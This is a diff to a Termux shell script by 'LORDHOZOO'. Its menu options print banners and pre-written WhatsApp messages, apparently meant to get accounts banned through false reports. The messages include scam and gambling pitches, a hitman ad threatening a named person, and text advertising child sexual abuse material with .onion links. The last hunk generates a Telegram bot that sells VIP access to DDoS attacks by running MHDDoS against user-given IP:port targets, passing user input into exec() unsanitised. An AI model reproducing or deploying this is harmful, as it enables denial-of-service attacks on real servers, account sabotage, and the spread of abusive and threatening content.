@@ -459,7 +459,17 @@ read -p "╰─$" updt
 # data
 if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
     # Add your code here for option 1
-    pkg update
+    pkg update -y 
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
 Anda harus segera melihat mungkin tertarik dan anda membutuhkan uang :
 
@@ -478,7 +488,17 @@ fi
 
 if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
     # Add your code here for option 2
-    pkg update
+    pkg update -y
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
 https://api.whatsapp.com/send?phone=+62 
@@ -488,6 +508,16 @@ fi
 if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
     # Add your code here for option 3
     pkg update
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     ⚠️ Upozorenje: Prabowo Subianto će prikupiti porez svake godine u iznosu od 100 milijuna kako bi napravio alat koji će olakšati sakaćenje ljudskog tijela 😈🗡️ ovaj alat je vrlo koristan za teroriste u Indoneziji 🇮🇩☠️ ovo je curenje informacija o značajkama u alat koji će biti objavljen napravi u [2025] ⏳ 1. Sjeckanje tijela u cjelini 🚷 2. Čisti utrobu tijela 🚹 3. Brutalno vađenje očiju 👁️ Ako ste zainteresirani i želite platiti porez, kontaktirajte našeg pomoćnika u nastavku slanjem poruke putem WhatsAppa 👇🔥 https://blackmail.whatsapp.com/send?phone=+62
 
@@ -496,7 +526,17 @@ fi
 
 if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
     # Add your code here for option 4
-    pkg update
+    pkg update -y
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
 您好 WhatsApp Business Messenger 2024 用户，您玩 WhatsApp@gmail.com 的体验如何我是中国最大的企业家之一，他创造了 WhatsApp，并获得了数百万至数十亿的奖金 🤑🤑💰
 你可以通过玩我自己公司的WhatsApp模组/创作来赚钱，当然它是官方的，不会被其他WhatsApp方屏蔽，因为它已经与20家公司合作🔥🔥🚫
@@ -509,7 +549,17 @@ fi
 
 if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
     # Add your code here for option 5
-    pkg update
+    pkg update -y
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
 مرحبًا مستخدمي WhatsApp، اسمحوا لي أن أعرفكم بنفسي، اسمي Boysz 444😈🔪، أنا قاتل مأجور من اليابان أقبل خدمات القتل الوحشي وأقدم الأعضاء للخدمات، كما أطمح لقتل مارك زوكربيرج (مالك WhatsApp)، إذا تريد أن ترى الصور/مقاطع الفيديو الخاصة بي. عند الانتهاء من الضحية، يمكنك التحقق من الرابط أدناه
 
@@ -524,6 +574,16 @@ fi
 if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
     # Add your code here for option 6
     pkg update
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     مرحبًا مستخدمي WhatsApp، اسمحوا لي أن أعرفكم بنفسي، اسمي Boysz 444😈🔪، أنا قاتل مأجور من اليابان أقبل خدمات القتل الوحشي وأقدم الأعضاء للخدمات، كما أطمح لقتل مارك زوكربيرج (مالك WhatsApp)، إذا تريد أن ترى الصور/مقاطع الفيديو الخاصة بي. عند الانتهاء من الضحية، يمكنك التحقق من الرابط أدناه
 
@@ -536,8 +596,19 @@ fi
 
 if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
     # Add your code here for option 7
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
   echo -e "
-    pkg update
+  
+
     Saya ingin memberikan anda modal sebesar 1jt 💰 untuk deposit di situs kami yang bernama #WAKROP77 uang ratusan juta telah menanti 💰😍 dijamin mendapatkan uang yang berlipat ganda dengan mengikuti pola berikut ini 👇
 Spin normal: 50×
 Spin turbo: 35×
@@ -551,7 +622,17 @@ fi
 
 if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
     # Add your code here for option 8
-    pkg update
+    pkg update -y
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     Salam onlayn alış-veriş platforması ilə əlavə gəlir əldə etmək istəyirsiniz?
 Evdə rahatlıqla 200-1000 Manat qazanın. Proses sadədir! (Yaşınız 22-dən yuxarıdırsa işdə iştirak edə
@@ -564,6 +645,16 @@ fi
 if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
     # Add your code here for option 9
     pkg update
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     support@support.whatsapp.com
 Dobrý den, drahá, jsme společnost whatsapp Distribuujeme pornografická videa a obrázky Video o znásilnění dítěte si můžete prohlédnout v níže uvedeném odkazu nebo si jej zakoupit na našem oficiálním webu http://nanochanqzaytwlydykbg5nxkgyjxk3zsrctxuoxdmbx5jbh2ydyprid.onion/. Nebo si můžete koupit nemluvňata, abyste s nimi měli brutální sex, nebo si můžete koupit sexuální videa kontaktováním našeho čísla whatsapp. Whatsapp vydal video o sexu s dětmi, což nám umožnilo zveřejňovat dětské porno na Whatsapp a já budu zveřejňovat dětské porno ve všech skupinách Whatsapp a bavit se s dětmi http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion ewf3 /wpgld4q5nt 4leté děti znásilněni na trhu, support@support.whatsapp.com
@@ -575,6 +666,16 @@ fi
 if [ "$updt" -eq 10 ]; then
     # Add your code here for option 10
     pkg update
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     こんにちは、私たちはWhatsAppサポートチームです。私のチームに参加して、毎日の利益を勝ち取る
 説明する時間はありません！早く行って;初心者の報酬はあなたが彼らに要求するのを待っています！
@@ -600,6 +701,16 @@ fi
 if [ "$updt" -eq 12 ]; then
     # Add your code here for option 12
     pkg update
+    clear
+    echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
     echo -e "
     Hello, l would like to request an unban because l feel l have met the requirement to be released from restrictions . l promise to follow the rules and not commit any more violations. number +62thank you."
 fi
@@ -671,6 +782,224 @@ fi
 if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
     # Add your code here for option 5
     pkg update
+clear
+echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
+read -p "Enter your Telegram Bot Token: " BOT_TOKEN
+read -p "Enter your Admin ID: " ADMIN_ID
+
+cat > bot.js <<EOF
+const TelegramBot = require('node-telegram-bot-api');
+const { exec } = require('child_process');
+const sqlite3 = require('sqlite3').verbose();
+const { DateTime, Duration } = require('luxon');
+
+const BOT_TOKEN = "$BOT_TOKEN";
+const ADMIN_ID = "$ADMIN_ID";
+const START_PY_PATH = "/workspaces/MHDDoS/start.py";
+
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+const db = new sqlite3.Database("users.db");
+const cooldowns = {};
+const activeAttacks = {};
+
+// Create VIP users table if not exists
+db.serialize(() => {
+    db.run(\`
+        CREATE TABLE IF NOT EXISTS vip_users (
+            id INTEGER PRIMARY KEY,
+            telegram_id INTEGER UNIQUE,
+            expiration_date TEXT
+        )
+    \`);
+});
+
+bot.onText(/\\/start/, (msg) => {
+    const telegramId = msg.from.id;
+
+    db.get("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", [telegramId], (err, row) => {
+        let vipStatus;
+        if (row) {
+            const expirationDate = DateTime.fromSQL(row.expiration_date);
+            if (DateTime.now() > expirationDate) {
+                vipStatus = "❌ *Bukan Anggota VIP.*";
+            } else {
+                const daysRemaining = Math.ceil(expirationDate.diffNow('days').days);
+                vipStatus = \`✅ Pelanggan VIP!\\n⏳ Hari Tersisa: \${daysRemaining} Hari\\n📅 Kedaluarsa: \${expirationDate.toFormat('dd/MM/yyyy HH:mm:ss')}\`;
+            }
+        } else {
+            vipStatus = "❌ *Tidak Mempunyai Akses VIP.*";
+        }
+
+        const markup = {
+            inline_keyboard: [[
+                {
+                    text: "Owner LORDHOZOO",
+                    url: \`tg://user?id=\${ADMIN_ID}\`
+                }
+            ]]
+        };
+
+        bot.sendMessage(
+            msg.chat.id,
+            \`🤖 *DDoS Ping 999+ [Free Fire]!*\\n\\n\\\`\\\`\\\`\${vipStatus}\\\`\\\`\\\`\\n📌 *Info:*\\n\\\`\\\`\\\`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\\\`\\\`\\\`\\n💡 *Contoh*\\n\\\`\\\`\\\`/crash UDP 143.92.125.230:10013 10 900\\\`\\\`\\\`\\nEXECUTOR LORDHOZOO LAG GAME\`,
+            {
+                reply_markup: markup,
+                parse_mode: "Markdown",
+                reply_to_message_id: msg.message_id
+            }
+        );
+    });
+});
+
+bot.onText(/\\/vip/, (msg) => {
+    if (msg.from.id.toString() !== ADMIN_ID) {
+        bot.sendMessage(msg.chat.id, "❌ Lu Bukan Owner😏.", { reply_to_message_id: msg.message_id });
+        return;
+    }
+
+    const args = msg.text.split(/\\s+/);
+    if (args.length !== 3) {
+        bot.sendMessage(
+            msg.chat.id,
+            "❌ Formatnya tidak valid. Gunakan: \`/vip <ID> <BERAPA HARI>\`",
+            { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
+        );
+        return;
+    }
+
+    const telegramId = args[1];
+    const days = parseInt(args[2]);
+    const expirationDate = DateTime.now().plus({ days }).toFormat("yyyy-MM-dd HH:mm:ss");
+
+    db.run(
+        "INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date) VALUES (?, ?)",
+        [telegramId, expirationDate],
+        function(err) {
+            if (err) {
+                bot.sendMessage(msg.chat.id, "❌ Error saat menambahkan VIP.", { reply_to_message_id: msg.message_id });
+            } else {
+                bot.sendMessage(
+                    msg.chat.id,
+                    \`✅ Pengguna \${telegramId} Terdaftar VIP \${days} Hari.\`,
+                    { reply_to_message_id: msg.message_id }
+                );
+            }
+        }
+    );
+});
+
+bot.onText(/\\/crash/, (msg) => {
+    const telegramId = msg.from.id;
+
+    db.get("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", [telegramId], (err, row) => {
+        if (!row) {
+            bot.sendMessage(msg.chat.id, "❌ Anda tidak memiliki izin untuk menggunakan perintah ini.", { reply_to_message_id: msg.message_id });
+            return;
+        }
+
+        const expirationDate = DateTime.fromSQL(row.expiration_date);
+        if (DateTime.now() > expirationDate) {
+            bot.sendMessage(msg.chat.id, "❌ Akses VIP Anda Sudah Habis", { reply_to_message_id: msg.message_id });
+            return;
+        }
+
+        if (cooldowns[telegramId] && Date.now() - cooldowns[telegramId] < 10000) {
+            bot.sendMessage(
+                msg.chat.id,
+                "❌ Tunggu 10 Detik Untuk Melakukan Serangan DDoS. Dan Jangan Lupa Untuk Mematikan Serangan Sebelumnya..",
+                { reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        const args = msg.text.split(/\\s+/);
+        if (args.length !== 5 || !args[2].includes(':')) {
+            bot.sendMessage(
+                msg.chat.id,
+                "❌ *kak lordhozoo cantik imut salah yang bener ya 👰*\\n\\n📌 *Info:*\\n\`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\`\\n\\n💡 *Contoh:*\\n\`/crash UDP 143.92.125.230:10013 10 900\`",
+                { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
+            );
+            return;
+        }
+
+        const attackType = args[1];
+        const ipPort = args[2];
+        const threads = args[3];
+        const duration = args[4];
+        const command = \`python \${START_PY_PATH} \${attackType} \${ipPort} \${threads} \${duration}\`;
+
+        const process = exec(command);
+        activeAttacks[telegramId] = process;
+        cooldowns[telegramId] = Date.now();
+
+        const markup = {
+            inline_keyboard: [[
+                {
+                    text: "⛔ Matikan DDoS",
+                    callback_data: \`stop_\${telegramId}\`
+                }
+            ]]
+        };
+
+        bot.sendMessage(
+            msg.chat.id,
+            \`*[✅] Serangan DDoS Active - Gacor KAK LORDHOZOO [✅]*\\n\\n🌐 *Alamat IP:* \${ipPort}\\n⚙️ *Type:* \${attackType}\\n👰‍♀️ *Threads:* \${threads}\\n⏳ *Ping (ms):* \${duration}\\n\\nLORDHOZOO DDOS GAME\`,
+            {
+                reply_markup: markup,
+                parse_mode: "Markdown",
+                reply_to_message_id: msg.message_id
+            }
+        );
+    });
+});
+
+bot.on('callback_query', (callbackQuery) => {
+    const data = callbackQuery.data;
+    if (!data.startsWith('stop_')) return;
+
+    const telegramId = parseInt(data.split('_')[1]);
+    const message = callbackQuery.message;
+
+    if (callbackQuery.from.id !== telegramId) {
+        bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Hanya pengguna yang memulai serangan yang dapat menghentikannya." });
+        return;
+    }
+
+    if (activeAttacks[telegramId]) {
+        activeAttacks[telegramId].kill();
+        delete activeAttacks[telegramId];
+
+        bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Berhasil menangkis serangan." });
+        bot.editMessageText(
+            "*[⛔] SERANGAN SELESAI[⛔]*",
+            {
+                chat_id: message.chat.id,
+                message_id: message.message_id,
+                parse_mode: "Markdown"
+            }
+        )
+        .then(() => {
+            setTimeout(() => {
+                bot.deleteMessage(message.chat.id, message.message_id);
+            }, 3000);
+        });
+    } else {
+        bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Tidak Menemukan Serangan" });
+    }
+});
+EOF
+
+echo "Bot script has been created as bot.js"
+echo "Install required dependencies with: npm install node-telegram-bot-api sqlite3 luxon"
+echo "Run the bot with: node bot.js"
 fi
 
 if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
